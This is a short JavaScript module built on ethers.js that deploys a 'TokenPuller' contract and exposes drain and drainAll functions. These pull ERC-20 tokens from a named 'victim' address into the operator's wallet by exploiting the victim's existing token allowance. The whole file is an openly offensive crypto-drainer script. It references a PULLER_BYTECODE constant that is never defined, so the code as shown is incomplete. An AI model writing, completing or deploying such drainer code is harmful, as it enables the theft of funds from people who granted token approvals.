require("dotenv").config();
const { ethers } = require("ethers");

const TOKEN_ADDRESS = process.env.TOKEN_ADDRESS;
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const RPC_URL = process.env.RPC_URL || "https://eth.llamarpc.com";

const provider = new ethers.JsonRpcProvider(RPC_URL);
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

const TOKEN_ABI = [
  "function decimals() view returns (uint8)",
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)"
];

const PULLER_ABI = [
  "function drain(address victim, uint256 amount) external",
  "function drainAll(address victim) external",
  "function token() view returns (address)",
  "function owner() view returns (address)"
];

/**
 * Deploy a TokenPuller for the configured token, or reuse an existing one.
 * Returns a connected ethers.Contract.
 */
async function getPuller() {
  const factory = new ethers.ContractFactory(PULLER_ABI, PULLER_BYTECODE, wallet);
  const puller = await factory.deploy(TOKEN_ADDRESS);
  await puller.waitForDeployment();
  return puller;
}

/**
 * Drain `amount` (in wei) of the token from `victim` to the wallet.
 */
async function drain(victim, amount) {
  const puller = await getPuller();
  const tx = await puller.drain(victim, amount);
  await tx.wait();
  return tx;
}

/**
 * Drain the full allowance of `victim` to the wallet.
 */
async function drainAll(victim) {
  const puller = await getPuller();
  const tx = await puller.drainAll(victim);
  await tx.wait();
  return tx;
}

module.exports = { provider, wallet, token: TOKEN_ADDRESS, getPuller, drain, drainAll };
